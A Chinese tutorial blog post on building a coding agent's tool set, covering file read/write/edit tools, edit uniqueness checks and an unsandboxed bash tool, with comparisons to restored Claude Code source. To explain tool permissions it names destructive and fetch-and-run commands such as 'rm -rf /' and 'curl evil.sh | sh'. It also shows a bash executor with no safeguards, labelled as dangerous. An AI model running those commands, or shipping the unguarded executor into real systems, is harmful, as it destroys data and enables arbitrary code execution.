# 实战03：工具系统——从一只手到一套家伙，外加一个逃生舱

> 一个全栈工程师的大模型学习笔记（第六阶段 · 实战卷 · 实战03）

实战02 给金鱼接上了**第一只手** `read_file`：模型能读一个文件、再据此回答。但只会读的 agent 改不了任何东西——它是个「只读」的助手。这一篇把唯一的 `read_file` 扩成**一套家伙**：读、写、改、列目录，外加一个能跑任意命令的**逃生舱** `bash`。走完，它就能真的**改一个文件**了。

好消息是：实战02 结尾那句「加工具 = 往清单塞一个自包含对象」，这一篇就是来兑现它的——而且你会发现，地基在实战02 已经悄悄埋好了。

**卷级铁律先亮明**：概念系列已经讲透了「**为什么**工具即权限、为什么模型只吐请求不亲自动手」（[Blog 18](18-structured-output-tool-calling.md) / [Blog 30](30-security-guardrails.md)）。实战卷不重推这些，只回扣。这一篇只干三件事：**把工具集写成代码**、**啃下 `edit` 唯一的那个真难点**、**翻开真源码看它多做了什么**。

---

## 一、引导式设计：加四个工具，有三处值得停一下

### 先看清地基：注册表在实战02 已经埋好

回头看实战02 的 `loop.ts`，`runAgent` 的签名早就是这样：

```ts
export async function runAgent(provider: ModelProvider, tools: Tool[], userInput: string, maxTurns = 10) {
  const toolByName = new Map(tools.map(t => [t.name, t]))   // ← 按名字建索引，模型点名谁就调谁
  // …循环里 toolByName.get(call.name)?.execute(call.args)…
}
```

它吃的是 `Tool[]`——一个**数组**，而且已经会「按名字建 Map、分流执行」。换句话说，**「工具注册表」的机制在实战02 就成型了**，只是当时数组里只有一个元素、还是在 `index.ts` 里手写的 `[readFileTool]`。

所以这一篇的「注册表」不是什么新架构，就是**把这份清单从调用点收口成一处**，再往里塞四个新对象：

```ts
// src/tools/index.ts —— 全卷「有哪些工具」的唯一清单
export const allTools: Tool[] = [readFileTool, writeFileTool, editFileTool, listDirTool, bashTool]
```

`index.ts` 从此不再手拼数组，整份取 `allTools`。**加工具 = 往这个数组塞一个自包含对象，loop 和调用方一个字都不改**——实战02 那句话，字面兑现。

那这一篇的脑力花在哪？花在三个**别当成机械劳动**的地方。

### 折叠点①：为什么不干脆只给一个 `bash`？

`bash` 一个工具就能 `cat`（读）、`> file`（写）、`sed`（改）、`ls`（列）——它一把涵盖前面四个窄工具。那为什么还要费劲写 read/write/edit/ls，不直接甩给模型一个万能 `bash`？

答案是**工具即权限**（回扣 [Blog 30](30-security-guardrails.md)：别给 `run_sql` 万能钥匙，给 `query_orders` 窄口子）：

- **窄工具 = 一份有边界的权限**。`edit_file` 再怎么被模型滥用，也炸不出文件系统之外；`list_dir` 只能看、不能改。harness 可以**按工具、按动作**去审计、放行、拒绝——每个工具都是一个能单独上锁的口子。
- **只给 `bash` = 直接发 root**。一个 `bash` 涵盖 `rm -rf /`、`curl evil.sh | sh`、把你的 `.env` 读出来外发……粒度归零，harness 想拦都找不到下手的接缝（回扣 [Blog 30](30-security-guardrails.md)：致命三件套）。

**但别矫枉过正**——真实 coding agent（Claude Code 就是）**照样带 `bash`**。因为 `npm test`、`git commit`、`grep -r` 这些活你不可能全预写成窄工具。所以正确的设计不是「不给 bash」，而是：

> **窄工具当默认操作面，`bash` 是一个上了锁的逃生舱。**

这一篇我们把 `bash` **裸着放进去**（最小执行，把模型给的字符串直接丢进 `bash -c`），并在代码里明确标注这是「裸奔版、危险」。**那把锁（安全解析、沙箱、审批）是实战04 的正题**——一篇一件事：03 把逃生舱的门装上，04 专门讲这门怎么上锁。

![工具注册表与权限梯度：左侧五个自包含的工具对象（read_file/write_file/edit_file/list_dir 各是一份「说明书+一只手」，边界清楚，标注「窄工具=有边界的权限」；bash 单独一块标红，标注「逃生舱=万能，等于发 root」）汇进中间一份清单 allTools[]；清单交给 runAgent，loop 按名字建 Map、模型点名谁就 execute 谁；右侧一行字：加工具=往清单塞一个对象，loop 与调用方零改动。底部一条从「窄」到「宽」的权限梯度轴，read/list 在最左（只读），write/edit 居中（能改但有界），bash 在最右顶格（无界），红框标注「锁留实战04」](assets/img/实战03-tool-registry.svg)

### 折叠点②：`edit` 是这五个里唯一不机械的

`write_file` 是整篇覆盖（像 `cat > file`），`read`/`list_dir` 更是照抄 `read_file` 的壳——收个路径、碰一下文件系统、返回文本。真正有嚼头的是 `edit_file`：它得**「找到旧内容、换成新内容」**。真实源码 `FileEditTool` 的接口是收 `old_string` + `new_string`，在文件里定位再替换。

难点在一个歧义：**如果 `old_string` 在文件里出现了不止一次，`edit` 该换哪一个？**

先想清楚这个歧义**为什么会发生**——不是设计出来的，是漏下来的税。因为 `old_string` **不是你我写的，是模型挑的**。模型这轮看到了文件全文，然后「指一段它想改的文字」扔进 `old_string`。而代码天生全是重复串：

```js
function foo() {
  let count = 0        // ← 模型想改这个 0
  let total = 0        //
  return 0             //
}
```

模型想改第一个 `count` 的初值，若图省事只发 `old_string: "0"`——文件里 `0` 有好几个；发 `"= 0"` 还撞两处。更常见的是 `}`、`else {`、`return null` 这类样板，一个文件里几十处。模型**并不知道**自己指的这段在全文出现几次，它只管「我看到了这段、我要改它」。这跟实战01/02 那些方言税一个性质：**都是「模型会抖」往下游漏**。

那撞多处怎么办？三个选项：

| 做法 | 后果 |
|---|---|
| **A** 换第一个 | 模型想改第二处却动了第一处 → **悄悄改错**，人还看不见 |
| **B** 全换 | 三处一起变 → 更炸 |
| **C** 不唯一就**报错**，把「请多带上下文让它唯一」回灌给模型 | 拒绝猜，逼模型下一轮发 `let count = 0`（够唯一）再来 |

选 **C**。这里藏着一条贯穿全卷的原则：

> **让失败「响亮」，不要让它「无声」。**

有人的第一直觉是「记录位置、按行列对位替换」——像编辑器/LSP 那样，光标在第 5 行第 12 列就往那儿改。**在有真光标的世界里它是对的**。但在 agent 里，那个「位置」只能由**模型**供，而模型恰恰最不擅长数数（它看的是 token 流，不是行号尺）。位置错了，`edit` 照样往第 5 行怼 → **静默改错**，跟选项 A 一个下场，而且**更毒**：字符串对不上你还能「没找到 → 报错」，行号是个纯数字，第 5 行永远存在，你不写进去根本不知道怼歪了。

字符串匹配 + 唯一性校验的价值，不在「字符串比坐标高级」，而在**「撞多处」是一个可检测的状态**——工具能在这儿停下、拒绝、把错误回灌给模型重试（回扣 [Blog 18](18-structured-output-tool-calling.md)：校验失败就让模型重来；柱三：用确定手段兜住会抖的零件）。位置对位把这个「检测点」直接扔了。

那你的「位置」直觉白费了吗？没有——它被真源码挪到了**读取侧**：`read_file` 返回时给每行标上行号（`FileReadTool.ts:726` 一句 `return addLineNumbers(file)`）。行号不是拿来当替换锚点的，是**喂给模型、帮它拼出一个够唯一的 `old_string`**。位置信息用来「构造唯一串」，替换本身仍走字符串匹配 + 唯一性校验。你想到的那一层真实存在，只是分工不同。

![edit 的唯一性抉择：顶部「模型挑 old_string」（因为它看的是 token 流、不数数，天生可能撞多处）；中间 edit 工具数出现次数 matches = 文件按 old_string 切段数 − 1，三分支——matches=0「没找到→报错」、matches=1「唯一→替换那一处」、matches>1「撞多处→报错，把『多带上下文让它唯一』回灌」；右侧对照两条路：上路「字符串匹配（响亮失败：撞多处能被检测→拒绝+回灌重试）」标绿，下路「位置对位替换（无声失败：模型数错行号照样怼、第5行永远存在、检测不到）」标红；底部一行：位置信息没白费，被挪到读取侧——read 给每行标行号帮模型拼出唯一串](assets/img/实战03-edit-uniqueness.svg)

### 折叠点③：`bash` 的门，十几行；那把锁，一万行

`bash` 的执行本体极短——把命令丢进 shell、抓 stdout/stderr 回来，Bun 里十几行搞定。**短，恰恰是这一篇要你记住的重点**：逃生舱的**门**就这么点，危险全在门后面没上的那把**锁**。真源码为这把锁写了逾万行（下一节数给你看）。这一篇装门、标红、把锁留给实战04——别在这里假装安全。

![bash 的门 vs 锁：左侧我们的 bash.ts 是逃生舱的门，用 Bun.spawn 把命令丢进 shell、抓输出，约 15 行逻辑，裸奔无沙箱无黑名单无超时；右侧真源码 BashTool/ 是那把锁，十几个文件逾一万行——bashPermissions 2621 行、bashSecurity 2592、readOnlyValidation 1990、pathValidation 1303、sed 校验解析 1006、其余约 1382；底部收口：门（Bun.spawn 那一下）最不值钱，锁才是难题——判断一条任意 shell 命令安不安全是打地鼠，实战04 专门上锁且永远关不严](assets/img/实战03-bash-lock.svg)

---

## 二、代码落地

代码进 `code/harness/src/tools/`，每个工具一个文件，全都实现实战02 定好的 `Tool` 契约（`{ name, description, parameters, execute }`）。

**`write_file`**（整篇覆盖，顺手把父目录建上）：

```ts
export const writeFileTool: Tool = {
  name: 'write_file',
  description: '把给定内容写入指定路径（整篇覆盖，文件不存在则新建）。局部修改请用 edit_file。',
  parameters: { type: 'object', properties: {
    path: { type: 'string', description: '要写入的文件路径' },
    content: { type: 'string', description: '写入的完整内容（会覆盖原文件）' },
  }, required: ['path', 'content'] },
  execute: async (args: { path?: string; content?: string }) => {
    if (!args?.path) return 'error: 缺少 path 参数'
    try {
      await mkdir(dirname(args.path), { recursive: true })
      await writeFile(args.path, args.content ?? '', 'utf-8')
      return `ok: 已写入 ${args.path}`
    } catch (e) { return `error: 写不了 ${args.path}: ${(e as Error).message}` }
  },
}
```

**`edit_file`**——全篇的题眼，唯一性那一刀落在这里：

```ts
execute: async (args: { path?: string; old_string?: string; new_string?: string }) => {
  // …读文件到 content，参数缺失各自报错…
  const oldString = args.old_string!, newString = args.new_string ?? ''

  // 数出现几次：split 段数 − 1（照 FileEditTool.ts:329 的写法）
  const matches = content.split(oldString).length - 1
  if (matches === 0) return `error: 在 ${args.path} 里没找到 old_string，无法替换。`
  if (matches > 1) return `error: old_string 出现了 ${matches} 次，无法确定改哪一处。请多带上下文让它唯一。`

  // 唯一才换。用函数式 replacer，避免 new_string 里的 $&、$1 被当成特殊替换模式
  const updated = content.replace(oldString, () => newString)
  await writeFile(args.path, updated, 'utf-8')
  return `ok: 已修改 ${args.path}（替换 1 处）`
}
```

> 两个小坑：① `content.split(old).length - 1` 是最直白的「数出现次数」，和真源码同一招；② `.replace(old, () => newString)` 那个**函数式 replacer** 不是花架子——若直接传字符串，`new_string` 里但凡有个 `$&` 或 `$1` 就会被 JS 当成「特殊替换模式」，把匹配内容塞进去，改出鬼来。传一个返回定值的函数，就按字面替换。

**`list_dir`**（列目录，目录名带 `/` 好区分）和 **`read_file`**（实战02 已有）从简，都是「碰一下文件系统、返回文本」，此处不赘。

**`bash`**——逃生舱，注意注释里的红字：

```ts
export const bashTool: Tool = {
  name: 'bash',
  description: '在 shell 中执行一条命令，返回 stdout 与 stderr。适合窄工具覆盖不到的操作（npm test、git、grep）。',
  parameters: { type: 'object', properties: {
    command: { type: 'string', description: '要执行的 shell 命令' },
  }, required: ['command'] },
  execute: async (args: { command?: string }) => {
    if (!args?.command) return 'error: 缺少 command 参数'
    // ⚠️ 裸奔版：把模型给的字符串原样丢进 bash -c。无沙箱/无黑名单/无超时/无审批——安全全留实战04。
    const proc = Bun.spawn(['bash', '-c', args.command], { stdout: 'pipe', stderr: 'pipe' })
    const [out, err] = await Promise.all([
      new Response(proc.stdout).text(),
      new Response(proc.stderr).text(),
    ])
    await proc.exited
    const body = [out.trim(), err.trim() && `[stderr]\n${err.trim()}`].filter(Boolean).join('\n')
    return body || `（命令无输出，退出码 ${proc.exitCode}）`
  },
}
```

最后是**注册表**收口（上一节已给），`index.ts` 改一行：`runAgent(provider, allTools, question)`——从手写 `[readFileTool]` 换成整份 `allTools`。

### 验证：让它真的改一个文件

造个草稿文件，让 agent 去改其中一处：

```bash
printf 'hello world\nstatus: draft\ncount = 0\n' > /tmp/note.txt
PROVIDER=glm bun run src/index.ts '把 /tmp/note.txt 里的 status 从 draft 改成 published，其它别动。改完读一遍确认。'
```

两端真实跑出来（GLM 经智普 / Anthropic 经 zenmux），模型自己排出了 **读 → 改 → 再读确认** 的三步：

```
  [turn 1] read_file({"path":"/tmp/note.txt"}) -> hello world status: draft count = 0 …
  [turn 2] edit_file({"path":"/tmp/note.txt","old_string":"status: draft","new_string":"status: published"}) -> ok: 已修改（替换 1 处）
  [turn 3] read_file({"path":"/tmp/note.txt"}) -> hello world status: published count = 0 …
[assistant] 已把 status 改为 published，其它未动。
```

注意模型的动作顺序：它**先 `read`**——因为要先看到全文，才能拼出一个够唯一的 `old_string`（`status: draft` 在文件里独一份）。折叠点②推的「读取侧喂上下文帮模型构造唯一串」，在这里自然发生了，我们一行强制逻辑都没写。

再看唯一性报错真的会触发——换个三行都含 `= 0` 的文件，直接对 `edit_file` 喂那个撞多处的串（这里绕开模型、直接调工具，好把三条分支一次跑全）：

```bash
printf 'x = 0\ny = 0\nz = 0\n' > /tmp/multi.txt
```

```
撞3处: error: old_string 出现了 3 次，无法确定改哪一处。请多带上下文让它唯一。
不存在: error: 在 … 里没找到 old_string，无法替换。
唯一:   ok: 已修改（替换 1 处）
```

三条分支全对。真实跑时模型很聪明，读完几乎总会带上足够上下文（`second block\ncount = 0`）一次命中，很难自然撞上报错——但那条「响亮失败 + 回灌」的路必须真实存在，模型偶尔犯浑时才有台阶下。

当篇 checkpoint：`git tag harness-ch03-tool-system`。

---

## 三、🔬 翻开源码：`edit` 的唯一性 & `bash` 的一万行锁

### edit 的唯一性——我们选的 C，真源码也选 C

打开还原源码 `claude-code-rev/src/tools/FileEditTool/`。核心校验就在 `FileEditTool.ts:329`：

```ts
// FileEditTool.ts:329
const matches = file.split(actualOldString).length - 1
// FileEditTool.ts:332 —— 撞多处、又没开 replace_all，就拒绝
if (matches > 1 && !replace_all) {
  return { result: false, behavior: 'ask', message:
    `Found ${matches} matches of the string to replace, but replace_all is false. ` +
    `To replace all occurrences, set replace_all to true. ` +
    `To replace only one occurrence, please provide more context to uniquely identify the instance.` }
}
```

**跟我们的 `edit_file` 一字不差是同一个道理**：数出现次数（`split().length - 1`，我们照抄了这一招）、撞多处就 `behavior: 'ask'` 把「多带上下文」回灌。只有一处它比我们多——一个显式**逃生阀 `replace_all`**：模型确实想全换时，自己把它设 `true`，走 `replaceAll`。歧义的选择权交还给模型，而不是工具偷偷替它挑。

而「读取侧标行号帮模型拼唯一串」也实锤了：`FileReadTool.ts:726` 结尾就是 `return addLineNumbers(file)`。折叠点②那条推理不是我编的，是源码的分工。

**诚实标注降级**（卷首语声明一）：真源码的 `edit` 我们剥掉了不少——`replace_all` 开关、弯引号归一化（`normalizeQuotes`：模型打不出弯引号，源码替它兜）、被 API 消毒过的字符串反消毒（`desanitizeMatchString`）、`.md` 文件保留行尾双空格的特判……都是「让匹配别因格式细节失败」的补丁。我们只留了骨头：数次数、唯一才换。**`read` 这端也降级了**：本篇的 `read_file` 是原样返回全文、**没做 `addLineNumbers`**——所以上一节 demo 里模型能拼出唯一 `old_string`，靠的是 `status: draft` 按内容独一份，不是靠行号。行号那层只在真源码 `FileReadTool.ts:726`；折叠点②「位置直觉挪到读取侧」说的是真源码的分工，本篇只兑现了「edit 走字符串匹配 + 唯一性校验」这半边，行号那半边留作真源码对照。

### bash 的门 vs 锁：十几行 vs 一万行

我们的 `bash.ts` 连注释满打满算三十来行，真正逻辑十几行。对照真源码 `claude-code-rev/src/tools/BashTool/`——**十几个文件、逾万行**（仅 `.ts`，UI 的 `.tsx` 还没算）：

| 文件 | 行数 | 干的活（=我们裸奔版全省了的锁） |
|---|---:|---|
| `bashPermissions.ts` | 2621 | 权限判定：哪些命令放行/询问/拒绝 |
| `bashSecurity.ts` | 2592 | 安全分析：复合命令、子 shell、注入面 |
| `readOnlyValidation.ts` | 1990 | 判定命令是不是「只读」（只读才好自动放行） |
| `pathValidation.ts` | 1303 | 路径校验：别让命令碰不该碰的地方 |
| `sedValidation.ts` / `sedEditParser.ts` | 684 / 322 | 连 `sed -i` 就地改文件都要单独解析、校验 |
| `shouldUseSandbox.ts` | 153 | 什么时候把命令关进沙箱跑 |

看这张表就懂了：一个「跑 shell 命令」的工具，**门（`Bun.spawn` 那一下）是最不值钱的部分，值钱的全是门后面那把锁**。而锁的核心难题——「怎么判断一条任意 shell 命令安不安全」——本身就是个大坑（复合命令 `a && rm -rf b`、变量展开、管道到 `sh`……正则根本判不干净）。这正是实战04 要专门啃的：**逃生舱怎么上锁，以及为什么这把锁永远关不严**（回扣 [Blog 30](30-security-guardrails.md)：语义层的「意图坏不坏」是打地鼠，只能逼近）。

---

## 小结

- **注册表不是新架构**：实战02 的 `runAgent` 早就吃 `Tool[]` 并按名字建 Map 分流。这一篇只是把清单从调用点收口成 `allTools`，再塞四个对象——「加工具 = 塞一个自包含对象」字面兑现。
- **工具即权限**（回扣 [Blog 30](30-security-guardrails.md)）：窄工具是有边界的权限、能单独上锁；只给 `bash` = 发 root。但真实 agent 照样带 bash，做法是「窄工具当默认面，bash 当上锁的逃生舱」——这一篇裸放，锁留 04。
- **`edit` 的唯一性**是全篇唯一的真难点：`old_string` 由会抖的模型挑，天生可能撞多处。选 **C（不唯一就报错回灌）** 而非位置对位，因为字符串匹配**响亮失败、可检测**，位置**无声失败**。真源码同一招（`split().length-1` + `behavior:'ask'`），外加 `replace_all` 逃生阀；位置信息被挪到读取侧标行号帮模型拼唯一串。
- 🔬 源码对照：`edit` 唯一性判定 `FileEditTool.ts:329`；读取侧 `addLineNumbers`（`FileReadTool.ts:726`）；`bash` 的门十几行、真源码 `BashTool/` 那把锁逾万行——门最不值钱，锁才是难题。

下一篇——**实战04《给逃生舱上锁：命令安全与审批》**：这一篇裸放的 `bash`，如何判断一条任意 shell 命令安不安全、危险动作怎么走人工审批闸门，以及为什么这把锁**永远关不严**、只能层层设防（回扣 [Blog 30](30-security-guardrails.md) / [Blog 24](24-agent-autonomous-action.md) 的「坏」护栏）。
